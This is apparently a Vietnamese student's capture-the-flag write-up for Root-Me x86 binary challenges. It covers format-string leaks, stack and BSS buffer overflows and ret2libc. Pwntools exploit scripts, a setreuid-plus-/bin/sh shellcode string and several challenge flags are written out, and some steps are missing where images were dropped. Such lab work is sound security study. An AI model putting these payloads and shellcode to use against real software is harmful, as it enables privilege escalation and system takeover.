---
title: '[LTAT] Overflow-based Exploitation'
slug: bof
type: writeup
date: 2021-11-21
summary: 'NT521 : Overflow-based Exploitation...'
tags: [security, writeup]
---

# NT521 : Overflow-based Exploitation
Helu mọi người, nhân tiện mình bị 1 đống bài pwn trên lớp dí nên mình viết luôn cái blog này cho vui :3 Nếu có gì sai sót thì thầy với các bạn đừng có dí em
#### [ELF x86 - Format string bug basic 1](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-1)
```
#include 
#include 
int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```
Đầy là code của bài đầu tiên, như chúng ta có thể đọc hiểu được code C trên là:
+ Flag từ server sẽ được đọc vào secret pointer, sau đó ghi vào biến buf
+ In giá trị của biến argv[1] ra màn hình
==> từ đó chúng ta có thể suy ra rằng có thể dùng lệnh printf tận dùng lỗi fmt ở printf và in ra flag :3
Như hình chúng ta có thể thấy được là leak đc các giá trị trong stack như sau:
```
00000020.0804b160.0804853d.00000009.bffffd07.b7e1b589.bffffbe4.b7fc3000.b7fc3000
.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.bffffbe4.bffffbf
0.47109600
```
Tuy nhiên vì cơ chế little edian nên các bytes sẽ bị đảo lại, điều đó cũng có nghĩa là flag của chúng ta đã bị đảo lại mỗi lần cụm 4bytes. Vì đã biết lí do thì chúng ta có thể viết 1 đoạn script exploit như sau:
```
from pwn import *
from binascii import unhexlify
output = "00000020.0804b160.0804853d.00000009.bffffd07.b7e1b589.bffffbe4.b7fc3000.b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.bffffbe4.bffffbf0.47109600"
x = output.split('.')
bytes=[]
bytes2=[]
for i in x:
	bytes.append(i)
for y in bytes:
    little_endian = y[6:] + y[4:-2] + y[2:-4] + y[0:-6]
    bytes2.append(little_endian)
a=""
for x in bytes2:
	a+= str(unhexlify(x)).strip('b').strip("'")
print(a)
# \x00\x00\x00`\xb1\x04\x08=\x85\x04\x08\t\x00\x00\x00\x07\xfd\xff\xbf\x89\xb5\xe1\xb7\xe4\xfb\xff\xbf\x000\xfc\xb7\x000\xfc\xb7`\xb1\x04\x08Dpa9d6)(Epamd\n\x00\xbf\x1b\x86\x04\x08\x02\x00\x00\x00\xe4\xfb\xff\xbf\xf0\xfb\xff\xbf\x00\x96\x10G
```
#### [ELF x86 - Format string bug basic 2](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-2)
```
#include 
#include 
#include 
#include 
int main( int argc, char ** argv )
{
        int var;
        int check  = 0x04030201;
        char fmt[128];
        if (argc  offset = 9
==> check_add = 0xbffffa88
CHuyển sang little edian = \xd8\xfa\xff\xbf
Tuy nhiên, có 1 việc nữa vì 0xdeadbeef là 1 số khá lớn ở dec nên việc ghi đè sẽ rất là khó khăn, nên chúng ta có thể chia ra và ghi đè mồi 2 bytes 0xdead và 0xbeef lần lượt ở check_add và check_add + 2.
Điều đó chúng ta có thể suy ra được như sau :
#### [ELF x86 Stack overflow basic 1](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1)
```
#include 
#include 
#include 
#include 
int main()
{
  int var;
  int check = 0x04030201;
  char buf[40];
  fgets(buf,45,stdin);
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
Đọc code chúng ta suy ra được như sau:
+ Bof ở code *fgets(buf,45,stdin)* khi đọc 45 bytes và buf size là 40. Có nghĩa 4 bytes tiếp sẽ đè lên biến check
+ gọi hàm bin/sh để lấy pas
Check offset như sau:
Sau đó chúng ta thay đổi giá trị của biến check theo little edian
```
from pwn import *
import os 
import sys
host = "challenge02.root-me.org"
port = 2222
username = "app-systeme-ch13"
passwd = "app-systeme-ch13"
def exploit():
	# payload = p32(0x80808080) + p32(0xbffffabc)
	# io.recvuntil(b"Enter your name: ")
	payload = b"a"*40 + p32(0xdeadbeef)
	io.send(payload)
	io.interactive()
conn = ssh(host=host, port=port, user=username, password=passwd)
io = conn.process("./ch13")
exploit()
```
#### [ELF x86 Stack overflow basic 2](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-2)
```
#include 
#include 
#include 
#include 
void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}
void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
void main()
{
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```
Phân tích đoạn code trên chúng ta có thể thấy :
+ Mục tiêu là sẽ gọi hàm shell
+ Buf size là 128
+ Và bof ở code *fgets(buf,133,stdin)*
shell address = 0x8048516
Với việc hàm fgets chỉ nhận 133 bytes thì việc đè lên EIP sẽ làm bytes thứ 129 sau 128 bytes của buf
B33r1sSoG0oD4y0urBr4iN
#### [ELF x86 Stack overflow basic 3](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-3)
```
#include 
#include 
#include 
#include 
#include 
void shell(void);
int main()
{
  char buffer[64];
  int check;
  int i = 0;
  int count = 0;
  printf("Enter your name: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 64)
        printf("Oh no...Sorry !\n");
      if(check == 0xbffffabc)
        shell();
      else
        {
            read(fileno(stdin),&i,1);
            switch(i)
            {
                case '\n':
                  printf("\a");
                  break;
                case 0x08:
                  count--;
                  printf("\b");
                  break;
                case 0x04:
                  printf("\t");
                  count++;
                  break;
                case 0x90:
                  printf("\a");
                  count++;
                  break;
                default:
                  buffer[count] = i;
                  count++;
                  break;
            }
        }
    }
}
void shell(void)
{
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}
```
Sau 7749 giờ tìm hiểu thì mình đã có cách sử dụng pwntools để connect tới server của root-me như sau:
```
from pwn import *
import os 
import sys
host = "challenge02.root-me.org"
port = 2222
username = "app-systeme-ch16"
passwd = "app-systeme-ch16"
def exploit():
	payload = p32(0x80808080) + p32(0xbffffabc)
	io.recvuntil(b"Enter your name: ")
	io.send(payload)
	io.interactive()
conn = ssh(host=host, port=port, user=username, password=passwd)
io = conn.process("./ch16")
exploit()
```
#### [ELF x86 Stack overflow basic 4](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4)
author : dr00py
Có thể thấy mình sẽ khai thác lỗi bof ở hàm strcmp.
Ở đây em sẽ chàn biến môi trường vào để khai thác lỗi, do bài này không để mình nhập input vào, nhưng trong đó hàm strcpy copy biến môi trường vào.
Disassembly vào hàm GetEnv, thấy được stack có độ lớn là 0x21c = 540.
Ta có được stack như sau:
Có thể thấy phần env của PATH gần với return address nhất, mình sẽ lợi dụng nó để bof đè return address, như trên stack, tính toán được offset của nó đến ret address là 160. Và return address mình sẽ là ở đâu? Ở đây em set 1 biến môi trường SHELLCODE, sau đó return address của mình sẽ trỏ vào nó. Cụ thể set biến môi trường như sau:
Nhưng còn 1 vấn đề nữa: khi ghi đè return address theo cách này, kí tự null (/x00) sẽ bịd dẩy xuống rep movsl dest. address, khiến cho chương trình bị lỗi. Thay vào đó em sẽ set 1 biến môi trường khác đè thằng rep movsl luôn
Vậy bây giờ mình có payload để set biến môi trường như sau:
PATH = “A”*160 + địa chỉ SHELLCODE env + địa chỉ TRASH env
Vậy làm sao để biết 2 địa chỉ trên, dựa vào Get environment variable address (github.com) em có thể dễ dàng biết.
Exploit:
Code tìm địa chỉ env:
Khởi tạo SHELLCODE env ở server và TRASH env ở server:
Lấy địa chỉ chúng nó:
Vậy là mình đã có đủ các nguyên liệu :D, sau đó viết payload truyền vào env PATH thôi:
FLAG: s2$srAkdAq18q
NOTE: nếu bị lỗi ở can’t find USERNAME thì nhớ export USERNAME=”” vào nha, em bị như vậy cả tiếng đồng hồ k biết mình bị sai chỗ nào :D
#### [ ELF x86 - Stack buffer overflow basic 5](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-5)
author : dr00py
```
#include 
#include 
#include 
#include 
#include 
#include 
#define BUFFER 512
struct Init
{
  char username[128];
  uid_t uid;
  pid_t pid;  
};
void cpstr(char *dst, const char *src)
{
  for(; *src; src++, dst++)
    {
      *dst = *src;
    }
  *dst = 0;
}
void chomp(char *buff)
{
  for(; *buff; buff++)
    {
      if(*buff == '\n' || *buff == '\r' || *buff == '\t')
        {
          *buff = 0;
          break;
        }
    }
}
struct Init Init(char *filename)
{
  FILE *file;
  struct Init init;
  char buff[BUFFER+1];  
  if((file = fopen(filename, "r")) == NULL)
    {
      perror("[-] fopen ");
      exit(0);
    }
  memset(&init, 0, sizeof(struct Init));
  init.pid = getpid();
  init.uid = getuid();
  while(fgets(buff, BUFFER, file) != NULL)
    {
      chomp(buff);
      if(strncmp(buff, "USERNAME=", 9) == 0)
        {
          cpstr(init.username, buff+9);
        }
    }
  fclose(file);
  return init;
}
int main(int argc, char **argv)
{
  struct Init init;
  if(argc != 2)
    {
      printf("Usage : %s \n", argv[0]);
      exit(0);
    }
  init = Init(argv[1]);
  printf("[+] Runing the program with username %s, uid %d and pid %d.\n", init.username, init.uid, init.pid);
  return 0;
}
```
Có thể thấy mình có thể khai thác lỗi bof ở hàm strncmp dựa vào việc nhập input, nhưng:
Input nhập vào ở:
return address ở:
và khoảng cách của chúng là:
nó đã vượt quá khai báo ở mảng buff (513 bytes)
Vậy việc thực thi bof ở input không được. Nhưng vẫn còn cách khác.
Ở đây hàm sẽ copy mảng char buff từ vị trí số 9 đổ đi vào init.username. Vậy mình có thể khai thác ở đây bằng cách thay đổi init.username để tràn qua return address thành địa chỉ của SHELLCODE env var (chi tiết tương tự bài basic 4). Stack ta có như sau:
Dựa vào đó chúng ta thực thi câu lệnh setreuid(1210, 1110) và system(“/bin/sh”, 0, 0).
Ta có được flag như sau :
#### [ELF x86 Stack overflow basic 6](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-6)
author : dr00py
Xem file c của đề, cơ bản ta xác định ngay lỗi stack buffer overflow sẽ ở vị trí strcpy. Bây giờ em sẽ checksec file xem có những cơ chế nào được bật.
Sơ qua thì thấy NX Enabled. Do mục đích của bài này là mình chạy shell thành công, nhưng khi NX enabled thì mình không thể chèn shellcode vào, thay vào đó em sẽ chọn cách khác, chính là leak libc để run system(“bin/sh”).
Mình có thể control được return address của hàm main, vì thế sẽ lợi dụng nó để thực hiện theo mục đích của mình. Cụ thể như sau:
Vì cần thực thi system(“bin/sh”), mình cần tìm địa chỉ của chúng ở đâu. Ở system là 0xb7e68310:
Ở “bin/sh”, cái này mình phải tìm trong libc, vì thế phải xác định libc ở đâu:
Có thể thấy: libc ở vị trí từ 0xb7e28000 -> 0xb7fd6000
/bin/sh ở 0xb7f8ad4c.
Việc còn lại là tính toán offset từ input đến return address, sau đó chèn 1 đoạn địa chỉ vào đại vì mục đích là thay đổi return address thôi.
Input em nhập vào 8 chữ A, để có thể dễ dàng xem thanh ghi trên stack hơn.
Có thể thấy, input ở vị trí 0xbffffb1c.
Return address nằm ở 0xbffffb3c.
Vậy offset = 0xbffffb3c - 0xbffffb1c = 32
Vậy payload của mình là: b’a’*32 + system + b’a’*4 + /bin/sh
Code:
Thực thi thành công:
Dùng lệnh ls -a để xem có file nào ẩn là flag không.
Đã tìm thấy flag rồi :D
#### [ELF x86 - BSS buffer overflow](https://www.root-me.org/en/Challenges/App-System/ELF-x86-BSS-buffer-overflow)
```
#include 
#include 
char username[512] = {1};
void (*_atexit)(int) =  exit;
void cp_username(char *name, const char *arg)
{
  while((*(name++) = *(arg++)));
  *name = 0;
} 
int main(int argc, char **argv)
{
  if(argc != 2)
    {
      printf("[-] Usage : %s \n", argv[0]);
      exit(0);
    }
  cp_username(username, argv[1]);
  printf("[+] Running program with username : %s\n", username);
  _atexit(0);
  return 0;
}
```
Phân tích đoạn code trên ta có được :
Đây là 1 hàm sẽ nhận input từ arg[1]
Hàm atexit sẽ return về 1 địa chỉ 1 hàm
Chúng ta có thể bof để ghi đè lên địa chỉ là hàm atexit sẽ trả về
Dùng gdb để check địa chỉ là offset của username và atexit như sau :
và chúng ta biết được atexit = username + 0x200
Tiếp theo đó chúng ta viết shellcode thực thi 2 lệnh sau đây:
setreuid(1210, 1110) và system(“/bin/sh”, 0, 0)
```
from pwn import *
import os
import sys
host = "challenge02.root-me.org"
port = 2222
username = "app-systeme-ch7"
passwd = "app-systeme-ch7"
BIN = "./ch7"
shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x66\xbb\xb7\x04\x66\xb9\x53\x04\xb0\x46\xcd\x80\x31\xc0\x31\xc9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\xb0\x0b\xcd\x80"
user_add = 0x804a040
payload = shellcode + b"a"*(0x200-len(shellcode)) + p32(user_add)
def exploit():
  # __breakpoint="""
  #   b*0x80484f1
  #   """
  # gdb.attach(io,__breakpoint)
  io.recvuntil(b"[+] Running program with username : ")
  io.interactive()
#io = process([BIN,payload])
# context.log_level = "debug"
conn = ssh(host=host, port=port, user=username, password=passwd)
io = conn.process(["./ch7",payload])
exploit()
```